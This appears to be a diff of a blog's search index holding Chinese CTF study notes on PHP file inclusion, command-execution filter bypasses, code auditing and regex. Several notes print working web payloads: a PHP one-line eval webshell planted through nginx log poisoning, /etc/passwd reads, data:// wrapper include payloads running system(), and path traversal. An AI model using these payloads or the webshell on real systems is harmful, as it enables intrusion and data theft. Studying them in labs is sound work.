+    <content><![CDATA[<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h4><p>这道题把协议也过滤,比如说php,data协议,所以我们可以使用一句话协议木马,比如:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="木马分析："><a href="#木马分析：" class="headerlink" title="木马分析："></a>木马分析：</h4><h5 id="插入位置"><a href="#插入位置" class="headerlink" title="插入位置:"></a>插入位置:</h5><p>1.首先，我们需要知道日志的位置,日志文件根据服务器的配置不同,先要了解服务器是nginx还是apache,然后再去查看日志文件位置。<br>payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>可以发现回显<br>2.然后通过nginx日志默认路径打开日志文件:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<p>3.将payloads写入日志文件:<br>为什么要在UA(user-agent)中写入payloads?因为UA是浏览器的标识符,方便隐藏。<br>如图:</p>
+<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image.png" class="" title="image">
+
+<h5 id="url中远程文件包含触发"><a href="#url中远程文件包含触发" class="headerlink" title="url中远程文件包含触发:"></a>url中远程文件包含触发:</h5><p>写入payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+<p>先调出文件:</p>
+<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1.png" class="" title="image-1">
+
+<p>然后再查看日志文件:<br>写入payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;cat fl0g.php&quot;);</span><br></pre></td></tr></table></figure>
+<p>嘻嘻,其实不行,要用URL编码:就是要把cat fl0g.php进行编码才可以,<br>这里存疑,为什么要用URL编码?之前system(“ls”)不用编码,为什么这里要编码?<br>应该写作：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log&amp;1=system(%22cat%20fl0g.php%22)%3</span><br></pre></td></tr></table></figure>
+<p>才可以利用repeater回显:</p>
+<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1-1736824226811-3-1736824231038-5.png" class="" title="image-1">
+
+<p><strong>这个点还是需要解决!</strong><br>我现在传参还是优先用URL编码传参罢</p>
+]]></content>
       <categories>
-          
-          <category> ctfshow web </category>
-          
+        <category>ctfshow web</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> sql注入 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>我的第一篇博客</title>
-      <link href="/2025/01/11/25.1.9/"/>
-      <url>/2025/01/11/25.1.9/</url>
-      
-        <content type="html"><![CDATA[<h3 id="这是我的第一篇博客"><a href="#这是我的第一篇博客" class="headerlink" title="这是我的第一篇博客"></a>这是我的第一篇博客</h3><p>第一次写博客,这是一个测试</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-  
-  
+      <tags>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql常规注入</title>
+    <url>/2025/01/11/sql%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>ctfshow web</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>代码审计套路</title>
+    <url>/2025/01/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A5%97%E8%B7%AF/</url>
+    <content><![CDATA[<h3 id="代码审计的一些套路总结"><a href="#代码审计的一些套路总结" class="headerlink" title="代码审计的一些套路总结"></a>代码审计的一些套路总结</h3><h4 id="buuctf-HCTF-2018-WarmUp-strpos-substr截取代码"><a href="#buuctf-HCTF-2018-WarmUp-strpos-substr截取代码" class="headerlink" title="[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码"></a>[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码</h4><p>首先来看源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">&amp;<span class="variable">$_page</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>特别注意的点就是:</strong><br>这里substr截取代码时的第三个参数是截取代码的长度,第二个参数是开始的长度<br>而巧妙之处就在于:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;?&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>这段代码将page手动加了一个?然后探测?的位置,而在主流编程语言中,字符串位置的参数都是从0开始的,例如我要探测:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mmk&amp;nina?</span><br></pre></td></tr></table></figure>
+<p>这里?的位置在参数8的位置,而截取的时候,长度是8,所以刚好把?前面的截取走了,并没有包含?<br>这里就可以解释为什么buuctf那道题的payloads为:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<p>为什么本应是..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg,还在前面多加了一个&#x2F;,因为函数把?前面的字符全部截取走了,只剩下?和前面多加的&#x2F;以及后面的路径: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag,这里的&#x2F;是include的分割符号</p>
+<p><strong>详细见[HCTF 2018]WarmUp1</strong>的wp。</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>命令执行:使用文件包含绕过</title>
+    <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<h3 id="ctfshow-web32"><a href="#ctfshow-web32" class="headerlink" title="ctfshow web32"></a>ctfshow web32</h3><h4 id="读题和简单分析"><a href="#读题和简单分析" class="headerlink" title="读题和简单分析:"></a>读题和简单分析:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里很简单明确:就是把shell flag php 这些关键词全部过滤了,主要是连后引号都过滤了,就不可以使用常规的命令执行了.</p>
+<h4 id="文件包含方法"><a href="#文件包含方法" class="headerlink" title="文件包含方法:"></a>文件包含方法:</h4><p>先说payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“ls”);?&gt;</span><br><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“cat flag.php”);?&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="分割符"><a href="#分割符" class="headerlink" title="分割符"></a>分割符</h5><p><strong>&amp;:</strong><br>这里就把这个指令分成了两部分:<br>前面一部分赋值给超全局变量$_GET[‘c’],后面一部分就是另外一段包含代码的对象,并不会赋值给前面的c变量.这两段是完全分开的。<br><strong>?&gt;绕过(这是我的易错点):</strong><br>有个这样的机制:<br>php默认的机制,php中的?&gt;符号前面的字符会自带分号,就绕过了分号”;”,十分巧妙.</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>使用文件包含解决命令执行题目,通法就是先将include函数包含一个参数传递给要被正则表达式检查的变量,然后再在后半部分,再包含php伪协议给前面部分的include函数读取,达到绕过preg_match并且执行命令的目的.</p>
+]]></content>
+      <categories>
+        <category>ctfshow web</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>命令执行绕过符号总结</title>
+    <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%AC%A6%E5%8F%B7%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h3 id="命令执行绕过符号总结"><a href="#命令执行绕过符号总结" class="headerlink" title="命令执行绕过符号总结"></a>命令执行绕过符号总结</h3><p>在命令执行这种题目中我们总会遇到正则过滤,不得不使用一些特殊符号来绕过,下面是常见的符号和对应的绕过方法:</p>
+<h4 id="空格"><a href="#空格" class="headerlink" title="空格:"></a>空格:</h4><p>%20<br>%09<br><strong>Linux知识拓展:</strong></p>
+<ul>
+<li>$IFS(Internal Field Separator),在shell环境里面,这个东西叫做内部字段分隔f符,它可以被设置为很多默认的字符,比如空格,制表符,换行符等。</li>
+<li>虽然它默认为空格,但是我们不可以在shell中直接用$IFS代表空格,我们需要用这些方法来设置:</li>
+<li>$IFS$1,我来解释一下:<br>在 shell 脚本和命令行中，$1 通常表示传递给脚本或函数的第一个位置参数<br>但是在内部字段分割符这个地方,它被用来调取内部字段分隔符的第一个字符,即空格,参数位置为$1的空格。所以我们在这里可以用$IFS$1来绕过空格。</li>
+</ul>
+<h4 id="换行符"><a href="#换行符" class="headerlink" title="换行符:"></a>换行符:</h4><p>%0a</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php超全局变量</title>
+    <url>/2025/01/14/php%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%89%B9%E6%80%A7%E6%B3%A8%E8%A7%A3/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>正则匹配注意点个人笔记</title>
+    <url>/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h3 id="正则匹配个人易忽略点记录"><a href="#正则匹配个人易忽略点记录" class="headerlink" title="正则匹配个人易忽略点记录"></a>正则匹配个人易忽略点记录</h3><h4 id="标志-模式修正符"><a href="#标志-模式修正符" class="headerlink" title="标志&#x2F;模式修正符"></a>标志&#x2F;模式修正符</h4><h5 id="1-多行修饰符-Multline"><a href="#1-多行修饰符-Multline" class="headerlink" title="1.多行修饰符(Multline)"></a>1.多行修饰符(Multline)</h5><p>与($,^)这两个检查首尾的符号紧密相关,注意点:在默认情况下,它们是默认检查全局，即所有字符的开头和结尾,即使你使用了换行符号,它也不会对首位进行检查。<br>例如表达式: &#x2F;.at(.)?$&#x2F;gm 表示小写字符a后跟小写字符t,末尾可选除换行符外任意字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/&quot; =&gt; The fat</span><br><span class="line">                cat sat</span><br><span class="line">                on the mat.</span><br></pre></td></tr></table></figure>
+<p>这里只匹配mat<br>但是:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/gm&quot; =&gt; The fat</span><br><span class="line">                  cat sat</span><br><span class="line">                  on the mat.</span><br></pre></td></tr></table></figure>
+<p>这里就会把fat,sat,mat都给匹配上</p>
+<p><strong>总结:</strong></p>
+<p>重点就是:m加上后会在每排匹配,没有m只会在全局看尾巴或者开头有没有目标字符。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>正则匹配</tag>
+      </tags>
+  </entry>
 </search>
